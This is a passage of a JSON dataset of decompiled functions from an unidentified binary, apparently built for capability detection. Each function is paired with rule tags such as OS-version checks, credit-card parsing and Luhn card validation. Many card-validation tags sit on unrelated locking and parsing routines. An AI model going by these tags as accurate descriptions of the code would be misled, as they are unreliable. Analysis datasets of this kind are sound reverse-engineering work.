        "decompiled_code": "\nvoid fcn.00022504(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    uint64_t arg1_00;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uchar auStackX8 [32];\n    char acStack328 [280];\n    \n    uVar7 = 0;\n    uVar8 = 0;\n    do {\n        iVar2 = fcn.00026a28(uVar8 + 0x191, acStack328, 0x104, auStackX8);\n        if (iVar2 == 0) {\n            if (acStack328[0] == '&') {\n                uVar3 = fcn.00030174(acStack328 + 1, 0, 0);\n                arg1_00 = uVar3;\n                if ((uVar3 == 0) || (iVar2 = fcn.00029124(arg1_00, 0xfffffffe, 1, 0),  iVar2 != 0))\n                goto code_r0x000225d4;\n            }\n            else {\n                arg1_00 = 0;\n            }\n            uVar4 = 0xffffffffffffffff;\n            pcVar5 = acStack328;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            if ((arg2 - uVar7) - 1 <= ~uVar4) {\n                if (arg1_00 != 0) {\n                    fcn.000293d4(arg1_00);\n                }\n                goto code_r0x000225ec;\n            }\n            pcVar5 = acStack328;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5[(uVar7 - acStack328) + arg1] = cVar1;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            iVar6 = -1;\n            pcVar5 = acStack328;\n            do {\n                if (iVar6 == 0) break;\n                iVar6 = iVar6 + -1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar7 = uVar7 + ~iVar6;\n        }\ncode_r0x000225d4:\n        uVar8 = uVar8 + 1;\n        if (9 < uVar8) {\ncode_r0x000225ec:\n            *(uVar7 + arg1) = 0;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 643
    },
    "00031878": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00031878(char *arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint8_t uVar6;\n    char cVar7;\n    \n    do {\n        uVar4 = 0;\n        iVar5 = 8;\n        pcVar1 = arg1;\n        do {\n            pcVar3 = pcVar1;\n            iVar2 = fcn.00061a9e();\n            uVar6 = iVar2 + ((iVar2 / 0x3e + (iVar2 >> 0x1f)) - (iVar2 * 0x84210843 >> 0x3f)) * -0x3e;\n            if (uVar6 < 10) {\n                cVar7 = uVar6 + 0x30;\n            }\n            else if (uVar6 - 10 < 0x1a) {\n                cVar7 = uVar6 + 0x37;\n            }\n            else {\n                cVar7 = uVar6 + 0x3d;\n            }\n            *pcVar3 = cVar7;\n            uVar4 = uVar4 + cVar7;\n            iVar5 = iVar5 + -1;\n            pcVar1 = pcVar3 + 1;\n        } while (iVar5 != 0);\n    } while ((((*arg1 == 'A') && (arg1[1] == 'B')) && (arg1[2] == 'C')) && (arg1[3] == 'D'));\n    pcVar3[1] = uVar4 / 0x1a + 0x41;\n    pcVar3[2] = 'z' - uVar4 % 0x1a;\n    return;\n}\n",
        "token_count": 398
    },
    "00031940": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.00031940(uint8_t *arg1, ulong arg2, uint *arg3)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t uVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    uint32_t uStack536;\n    uint32_t uStack532;\n    uint64_t uVar5;\n    \n    if (10 < arg2) {\n        uVar7 = 0;\n        uVar6 = 0;\n        uVar5 = uVar7;\n        puVar1 = arg1;\n        do {\n            puVar8 = puVar1;\n            if (*puVar8 < 0x21) {\n                return 0;\n            }\n            if (0x7f < *puVar8) {\n                return 0;\n            }\n            uVar6 = uVar6 + *puVar8;\n            uVar2 = uVar5 + 1;\n            uVar5 = uVar2;\n            puVar1 = puVar8 + 1;\n        } while (uVar2 < 8);\n        if (0x200 < arg2 - 10) {\n            arg2._0_4_ = 0x20a;\n        }\n        if (((puVar8[1] == uVar6 / 0x1a + 0x41) && (puVar8[2] == 0x7a - uVar6 % 0x1a)) &&\n           (iVar3 = fcn.0002f058(arg1 + 10, &uStack536, arg2 - 10),  iVar3 == 8)) {\n            do {\n                puVar1 = &uStack536 + uVar7;\n                uVar7 = uVar7 + 1;\n                *puVar1 = *puVar1 ^ puVar1[arg1 - &uStack536];\n            } while (uVar7 < 8);\n            uVar4 = fcn.0002fcf4(uStack536);\n            *arg3 = uVar4;\n            uVar4 = fcn.0002fcf4(uStack532);\n            arg3[1] = uVar4;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 508
    },
    "00031d58": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.00031d58(void)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    \n    puVar3 = 0x7afd8;\n    uVar2 = 0;\n    *0x7afd8 = 0;\n    *0x7afe0 = 0;\n    *0x7afe8 = 0;\n    do {\n        fcn.00026a7c(uVar2 + 0x2f3, 0);\n        uVar1 = fcn.0002fd20();\n        uVar2 = uVar2 + 1;\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n    } while (uVar2 < 10);\n    return 0;\n}\n",
        "token_count": 177
    },
    "00031dd0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.00031dd0(int16_t param_1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    piVar1 = 0x7afd8;\n    do {\n        if (*piVar1 == param_1) {\n            return 1;\n        }\n        uVar2 = uVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (uVar2 < 10);\n    return 0;\n}\n",
        "token_count": 118
    },
    "0004009c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nulong fcn.0004009c(uint32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t *puVar3;\n    ulong uVar4;\n    char *arg1_00;\n    bool bVar5;\n    \n    if (arg2 < 0xd) {\n        return 0;\n    }\n    bVar5 = *arg1 < *0x15964;\n    if ((*arg1 == *0x15964) && (bVar5 = *(arg1 + 1) < *0x15968,  *(arg1 + 1) == *0x15968)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = (1 - bVar5) - (bVar5 != 0);\n    }\n    puVar3 = arg1;\n    if (iVar1 != 0) {\n        bVar5 = *arg1 < *0x1595c;\n        if ((*arg1 == *0x1595c) && (bVar5 = *(arg1 + 1) < *0x15960,  *(arg1 + 1) == *0x15960)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar5) - (bVar5 != 0);\n        }\n        if (iVar1 != 0) {\n            return 0;\n        }\n        iVar2 = fcn.00061bb8(arg1, 10, arg2);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        puVar3 = iVar2 + 1;\n        arg2._0_4_ = arg2 + (arg1 - puVar3);\n        if (arg2 < 0xd) {\n            return 0;\n        }\n        bVar5 = *puVar3 < *0x15964;\n        if ((*puVar3 == *0x15964) && (bVar5 = *(iVar2 + 5) < *0x15968,  *(iVar2 + 5) == *0x15968)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar5) - (bVar5 != 0);\n        }\n        if (iVar1 != 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.00030244(*(puVar3 + 5));\n    if (((iVar1 == 0x54) && (iVar1 = fcn.00030244(*(puVar3 + 6)),  iVar1 == 0x4f)) && (*(puVar3 + 7) == ':')) {\n        puVar3 = puVar3 + 2;\n        for (arg2._0_4_ = arg2 - 8; (*puVar3 == ' ' && (arg2 != 0)); arg2._0_4_ = arg2 - 1) {\n            puVar3 = puVar3 + 1;\n        }\n        if ((3 < arg2) && (*puVar3 == '<')) {\n            arg1_00 = puVar3 + 1;\n            uVar4 = 0x40;\n            iVar2 = fcn.00061bb8(arg1_00, 0x40, arg2 - 1);\n            if ((iVar2 != 0) && (iVar2 - arg1_00 == 10)) {\n                uVar4 = fcn.00031aac(arg1_00, uVar4);\n                return uVar4;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 790
    },
    "0005aff0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint64_t fcn.0005aff0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t arg1_00;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    uint8_t uVar14;\n    \n    arg1_00 = arg2;\n    iVar3 = fcn.0002fbc4(arg1_00);\n    if (iVar3 != 0) {\n        if (arg2 < 0xb) {\n            fcn.000619f6(iVar3, arg1, arg1_00);\n        }\n        else {\n            uVar4 = arg1_00 & 0xffffffff;\n            iVar9 = 0;\n            do {\n                uVar2 = uVar4 / 10;\n                iVar9 = iVar9 + uVar4 % 10;\n                uVar4 = uVar2;\n            } while (0 < uVar2);\n            uVar14 = 0;\n            iVar11 = 0;\n            iVar8 = 0;\n            iVar13 = 0;\n            arg2._0_4_ = arg2 / iVar9;\n            if (0 < arg2) {\n                iVar7 = 0;\n                do {\n                    iVar5 = 0;\n                    do {\n                        if (0 < iVar9) {\n                            puVar10 = iVar11 + arg1;\n                            iVar12 = iVar9;\n                            do {\n                                iVar6 = iVar7 + 1;\n                                uVar14 = uVar14 | ((*puVar10 & 1 << (iVar5 & 0x1f)) >> (iVar5 & 0x1f)) << (iVar7 & 0x1f)\n                                ;\n                                iVar7 = iVar6;\n                                if (7 < iVar6) {\n                                    *(iVar13 + iVar3) = uVar14;\n                                    iVar8 = iVar8 + 1;\n                                    iVar13 = iVar13 + 1;\n                                    uVar14 = 0;\n                                    iVar7 = 0;\n                                }\n                                puVar10 = puVar10 + arg2;\n                                iVar12 = iVar12 + -1;\n                            } while (iVar12 != 0);\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 8);\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < arg2);\n            }\n            iVar11 = iVar8;\n            if (iVar11 < arg1_00) {\n                puVar10 = iVar11 + iVar3;\n                iVar13 = iVar3 - iVar11;\n                do {\n                    puVar1 = iVar13 + iVar11;\n                    iVar11 = iVar11 + 1;\n                    *puVar10 = *puVar1 ^ puVar10[arg1 - iVar3];\n                    puVar10 = puVar10 + 1;\n                } while (iVar11 < arg1_00);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 704
    },
    "00019388": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nvoid fcn.00019388(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    ulong *puVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    uVar7 = arg2 & 0xffffffff;\n    iVar3 = fcn.0002fbc4(arg2 & 0xffffffff);\n    if (iVar3 != 0) {\n        fcn.000619f6(iVar3, arg1, uVar7);\n        fcn.0002f23c(0x78b40);\n        fcn.0002fc50(*0x79988);\n        pcVar1 = arg1 + uVar7;\n        *0x79978 = uVar7;\n        *0x79980 = arg1;\n        *0x79988 = iVar3;\n        if (arg1 < pcVar1) {\n            puVar6 = 0x78b78;\n            do {\n                pcVar8 = arg1;\n                cVar2 = *arg1;\n                while ((cVar2 != '\\0' && (pcVar8 < pcVar1))) {\n                    pcVar8 = pcVar8 + 1;\n                    cVar2 = *pcVar8;\n                }\n                if ((*arg1 != '\\0') && (puVar4 = fcn.00061a86(arg1, 0x23),  puVar4 != NULL)) {\n                    *puVar4 = 0;\n                    iVar3 = 2;\n                    puVar4 = puVar4 + 1;\n                    bVar9 = puVar4 == NULL;\n                    pcVar5 = 0x11a44;\n                    do {\n                        if (iVar3 == 0) break;\n                        iVar3 = iVar3 + -1;\n                        bVar9 = *arg1 == *pcVar5;\n                        arg1 = arg1 + 1;\n                        pcVar5 = pcVar5 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        puVar6[-2] = puVar4;\n                        puVar4 = fcn.00061a86(puVar4, 0x23);\n                        if (puVar4 != NULL) {\n                            *puVar4 = 0;\n                            *puVar6 = puVar4 + 1;\n                            puVar4 = fcn.00061a86(puVar4 + 1, 0x23);\n                            if (puVar4 != NULL) {\n                                *puVar4 = 0;\n                                puVar6[1] = puVar4 + 1;\n                                puVar4 = fcn.00061a86(puVar4 + 1, 0x23);\n                                if (puVar4 != NULL) {\n                                    *puVar4 = 0;\n                                    pcVar5 = puVar4 + 1;\n                                    if ((puVar4[2] == '#') || (puVar4[2] == '\\0')) {\n                                        if ((*pcVar5 == '1') || ((*pcVar5 == 'y' || (*pcVar5 == 'Y')))) {\n                                            *(puVar6 + 0x1a) = 1;\n                                        }\n                                        else {\n                                            if (((*pcVar5 != '0') && (*pcVar5 != 'n')) && (*pcVar5 != 'N'))\n                                            goto code_r0x0001951b;\n                                            *(puVar6 + 0x1a) = 0;\n                                        }\n                                        puVar4 = fcn.00061a86(pcVar5, 0x23);\n                                        if (puVar4 == NULL) {\n                                            puVar6[2] = 0;\n                                        }\n                                        else {\n                                            *puVar4 = 0;\n                                            puVar6[2] = puVar4 + 1;\n                                        }\n                                        *(puVar6 + 0x19) = 1;\n                                        *(puVar6 + 3) = 1;\n                                        *(puVar6 + 5) = 0;\n                                        puVar6[4] = 0;\n                                        puVar6[6] = 0;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\ncode_r0x0001951b:\n                puVar6 = puVar6 + 9;\n                arg1 = pcVar8 + 1;\n            } while (pcVar8 + 1 < pcVar1);\n        }\n        fcn.0002f2a4(0x78b40);\n    }\n    return;\n}\n",
        "token_count": 1004
    },
    "00019548": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t fcn.00019548(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg3_00;\n    uint32_t uStackX16;\n    \n    uVar1 = fcn.00030174(arg2 + 1, 0, 0);\n    iVar2 = fcn.000266fc(3, uVar1, 0, 0);\n    if (iVar2 == 0) {\n        arg3_00 = fcn.0002fbc4(uStackX16);\n        if (arg3_00 == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            uVar1 = fcn.000266fc(3, uVar1, arg3_00, uStackX16);\n            if (uVar1 == 0) {\n                uVar1 = fcn.0004d7bc(arg1, arg3_00, arg2, arg2);\n            }\n            fcn.0002fc50(arg3_00);\n        }\n    }\n    else {\n        uVar1 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 282
    },
    "0001a8b4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0001a8b4(ulong noname_0, ulong noname_1, ulong arg3, int64_t *arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (arg4 == NULL) {\n        uVar1 = 0xc000000d;\n    }\n    else {\n        iVar2 = (**0x11128)(noname_0, noname_1, 0, 0, 0);\n        if (iVar2 == 0) {\n            uVar1 = 0xc0000001;\n        }\n        else {\n            (**0x11120)(iVar2, 0, arg3);\n            *arg4 = iVar2;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "0001a960": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nulong fcn.0001a960(int64_t *arg1, uint64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong *in_stack_00000028;\n    \n    if (arg1 == NULL) {\n        uVar1 = 0xc00000ef;\n    }\n    else {\n        uVar1 = fcn.0001a8b4(*arg1, arg2, arg4, in_stack_00000028);\n        if (uVar1 == 0) {\n            iVar2 = (**0x11220)(*in_stack_00000028, arg2 & 0xffffffffffffff00 | noname_2, 1, 0, 0, 0x10);\n            if (iVar2 == 0) {\n                fcn.0001a924(*arg1, *in_stack_00000028);\n                uVar1 = 0xc0000001;\n            }\n            else {\n                *arg1 = iVar2;\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 246
    },
    "00023554": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.00023554(void)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint32_t auStackX8 [2];\n    int64_t aiStackX16 [3];\n    \n    uVar3 = fcn.00026a7c(1, 0);\n    iVar4 = fcn.000217f8(uVar3, 0, auStackX8, aiStackX16);\n    if (iVar4 == 0) {\n        uVar3 = 0;\n        if (auStackX8[0] != 0) {\n            iVar5 = 0;\n            do {\n                iVar2 = aiStackX16[0];\n                uVar1 = *(iVar5 + 0x2c + aiStackX16[0]);\n                if (*(iVar5 + 0x30 + aiStackX16[0]) == uVar1) {\n                    fcn.0002331c(*(iVar5 + aiStackX16[0]), *(iVar5 + 4 + aiStackX16[0]), uVar1, \n                                 *(iVar5 + 0xc + aiStackX16[0]));\n                }\n                else {\n                    iVar4 = fcn.00030130(0);\n                    if (iVar4 - *(iVar5 + 0x20 + iVar2) < 0x93a81) {\n                        if (uVar3 == auStackX8[0] - 1) break;\n                        fcn.00026e2c(5, 0, 0x215901f6, 0);\n                        fcn.0002191c(*(iVar5 + aiStackX16[0]), *(iVar5 + 8 + aiStackX16[0]), \n                                     *(iVar5 + 4 + aiStackX16[0]));\n                    }\n                    else {\n                        fcn.0002191c(*(iVar5 + iVar2), *(iVar5 + 8 + iVar2), *(iVar5 + 4 + iVar2));\n                        fcn.00026e2c(5, 0x21590204, 0x21590002, 0);\n                        fcn.00021da8(0xffffffff, 1, *(iVar5 + 0xc + aiStackX16[0]), 0);\n                    }\n                }\n                uVar3 = uVar3 + 1;\n                iVar5 = iVar5 + 0x40;\n            } while (uVar3 < auStackX8[0]);\n        }\n        fcn.0001a254(aiStackX16[0]);\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "000266b8": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t fcn.000266b8(uint *arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack24 [16];\n    \n    iVar1 = fcn.00026638(auStack24, 0x10);\n    if (iVar1 == 0) {\n        *arg1 = 0xfffffffd;\n    }\n    else {\n        if (iVar1 != 5) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n        *arg1 = 0xfffffffe;\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "00027c50": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.00027c50(char *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    int64_t *arg1_00;\n    ulong *puVar2;\n    code *apcStackX24 [2];\n    \n    fcn.00031088(0x7a4c8);\n    for (puVar2 = *0x7a4e8; puVar2 != NULL; puVar2 = *puVar2) {\n    }\n    fcn.00031108(0x7a4c8);\n    arg1_00 = fcn.0002fbc4(0x148);\n    if (arg1_00 == NULL) {\n        iVar1 = fcn.0002fde4();\ncode_r0x00027ded:\n        if (iVar1 == 0) goto code_r0x00027e01;\n    }\n    else {\n        fcn.00061a56(arg1_00, 0, 0x148);\n        if (arg2 == 0) {\n            if (*arg1 == '&') {\n                iVar1 = fcn.00027a4c(arg1, arg1_00);\n            }\n            else {\n                iVar1 = fcn.000279c0(arg1_00, arg1);\n            }\n        }\n        else {\n            *(arg1_00 + 0x134) = 0;\n            *(arg1_00 + 0x26) = 1;\n            iVar1 = fcn.0004d7bc(0, arg2, arg1, arg1);\n        }\n        if (iVar1 == 0) {\n            fcn.00061b0a(arg1_00 + 2, arg1, 0x104);\n            *(arg1_00 + 0x113) = 0;\n            fcn.00031088(0x7a4c8);\n            for (puVar2 = *0x7a4e8; (puVar2 != NULL && (puVar2[1] != arg1_00[1])); puVar2 = *puVar2) {\n                iVar1 = fcn.00061ad4(puVar2 + 2, arg1_00 + 2);\n                if (iVar1 == 0) break;\n            }\n            fcn.00031108(0x7a4c8);\n            if (puVar2 == NULL) {\n                iVar1 = fcn.0004afbc(arg1_00[1], 0x11a58, apcStackX24);\n                if (iVar1 == 0) {\n                    fcn.0004afbc(arg1_00[1], 0x11ec8, arg1_00 + 0x23);\n                    fcn.0004afbc(arg1_00[1], 0x11a48, arg1_00 + 0x24);\n                    iVar1 = (*apcStackX24[0])(*0x7a4e8);\n                    if (iVar1 == 0) {\n                        fcn.00031198(0x7a4c8);\n                        **0x7a4e0 = arg1_00;\n                        *0x7a4e0 = arg1_00;\n                        fcn.00031218(0x7a4c8);\n                        goto code_r0x00027ded;\n                    }\n                }\n            }\n            else {\n                iVar1 = 0x215901fc;\n            }\n        }\n    }\n    fcn.00027990(arg1_00);\n    fcn.0002fc50(arg1_00);\ncode_r0x00027e01:\n    fcn.00031088(0x7a4c8);\n    for (puVar2 = *0x7a4e8; puVar2 != NULL; puVar2 = *puVar2) {\n    }\n    fcn.00031108(0x7a4c8);\n    return iVar1;\n}\n",
        "token_count": 871
    },
    "000294bc": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.000294bc(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    ulong arg4;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    aiStackX24[0] = 0;\n    fcn.0002f23c(0x7a528);\n    iVar1 = fcn.000217f8(0xfffffffe, 8, auStackX16, aiStackX24);\n    if (iVar1 == 0) {\n        uVar4 = 0;\n        if (auStackX16[0] != 0) {\n            iVar3 = 0;\n            uVar2 = auStackX16[0];\n            do {\n                if (*(iVar3 + 0x10 + aiStackX24[0]) == arg1) {\ncode_r0x0002951b:\n                    arg4 = 0;\ncode_r0x00029526:\n                    fcn.000219dc(*(iVar3 + aiStackX24[0]), *(iVar3 + 8 + aiStackX24[0]), *(iVar3 + 4 + aiStackX24[0]), \n                                 arg4);\n                    fcn.000293d4(*(iVar3 + 0xc + aiStackX24[0]));\n                    uVar2 = auStackX16[0];\n                }\n                else if (*(iVar3 + 0x1c + aiStackX24[0]) == arg1) {\n                    if (*(iVar3 + 0x10 + aiStackX24[0]) == arg1) goto code_r0x0002951b;\n                    arg4 = 3;\n                    goto code_r0x00029526;\n                }\n                uVar4 = uVar4 + 1;\n                iVar3 = iVar3 + 0x40;\n            } while (uVar4 < uVar2);\n        }\n    }\n    fcn.0002f2a4(0x7a528);\n    fcn.0001a254(aiStackX24[0]);\n    return;\n}\n",
        "token_count": 471
    },
    "0002957c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0002957c(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    aiStackX24[0] = 0;\n    fcn.0002f23c(0x7a528);\n    iVar1 = fcn.000217f8(0xfffffffe, 8, auStackX16, aiStackX24);\n    if ((iVar1 == 0) && (uVar3 = 0,  auStackX16[0] != 0)) {\n        iVar2 = 0;\n        do {\n            if (arg1 != 0) {\n                fcn.000219dc(*(iVar2 + aiStackX24[0]), *(iVar2 + 8 + aiStackX24[0]), *(iVar2 + 4 + aiStackX24[0]), 2);\n            }\n            fcn.000293d4(*(iVar2 + 0xc + aiStackX24[0]));\n            uVar3 = uVar3 + 1;\n            iVar2 = iVar2 + 0x40;\n        } while (uVar3 < auStackX16[0]);\n    }\n    fcn.0002f2a4(0x7a528);\n    fcn.0001a254(aiStackX24[0]);\n    return;\n}\n",
        "token_count": 319
    },
    "000301cc": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.000301cc(uint16_t *arg1, uint16_t **arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint auStackX16 [6];\n    uchar auStack40 [16];\n    \n    fcn.000619f0(auStack40);\n    iVar1 = fcn.00061b70(auStack40, arg3, auStackX16);\n    if (iVar1 != 0) {\n        auStackX16[0] = 0;\n    }\n    if (arg2 != NULL) {\n        for (; (((0x2f < *arg1 && (*arg1 < 0x3a)) || ((0x60 < *arg1 && (*arg1 < 0x67)))) ||\n               ((0x40 < *arg1 && (*arg1 < 0x47)))); arg1 = arg1 + 1) {\n        }\n        *arg2 = arg1;\n    }\n    return auStackX16[0];\n}\n",
        "token_count": 217
    },
    "00031108": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.00031108(int32_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = 0;\n    iVar3 = 1;\n    (*_fcn.00011628)(*(arg1 + 4) + 0x40, 0, 0, 0, 0);\n    piVar1 = arg1 + 2;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        if (arg1[1] < 1) {\n            iVar2 = *arg1;\n            if (0 < iVar2) {\n                *arg1 = 0;\n                iVar4 = *(arg1 + 4);\n                arg1[2] = iVar2;\n                iVar3 = iVar2;\n            }\n        }\n        else {\n            arg1[2] = -1;\n            iVar4 = *(arg1 + 4) + 0x20;\n            arg1[1] = arg1[1] + -1;\n        }\n    }\n    (**0x11388)(*(arg1 + 4) + 0x40, 0);\n    if (iVar4 != 0) {\n        (**0x11400)(iVar4, 0, iVar3, 0);\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "00031218": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.00031218(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = 0;\n    (*_fcn.00011628)(*(arg1 + 4) + 0x40, 0, 0, 0, 0);\n    arg1[2] = 0;\n    iVar2 = 1;\n    if (arg1[1] < 1) {\n        iVar1 = *arg1;\n        if (0 < iVar1) {\n            *arg1 = 0;\n            iVar3 = *(arg1 + 4);\n            arg1[2] = iVar1;\n            iVar2 = iVar1;\n        }\n    }\n    else {\n        arg1[2] = -1;\n        iVar3 = *(arg1 + 4) + 0x20;\n        arg1[1] = arg1[1] + -1;\n    }\n    (**0x11388)(*(arg1 + 4) + 0x40, 0);\n    if (iVar3 != 0) {\n        (**0x11400)(iVar3, 0, iVar2, 0);\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "000355d8": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
